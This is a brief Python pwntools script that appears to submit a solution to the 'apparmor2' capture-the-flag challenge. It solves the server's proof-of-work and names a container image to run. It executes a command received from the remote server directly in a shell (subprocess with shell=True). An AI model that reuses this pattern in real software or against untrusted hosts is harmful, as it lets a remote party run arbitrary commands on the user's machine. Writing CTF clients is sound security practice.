from pwn import *

p = remote('apparmor2.hackable.software', 1337)

p.recvuntil('Proof of Work: ')
cmd = p.recvuntil('\n', drop=True)
print("Executing %r" % cmd)
out = subprocess.check_output(cmd, shell=True)
print('out %r' % out)
p.recvuntil('PoW: ')
p.sendline(out.rstrip())

p.recvuntil("Image name to run (shared with 'dragonsectorclient' on registry.gitlab.com)\n")
p.sendline('mytempaccount123/test')
print(p.recv())

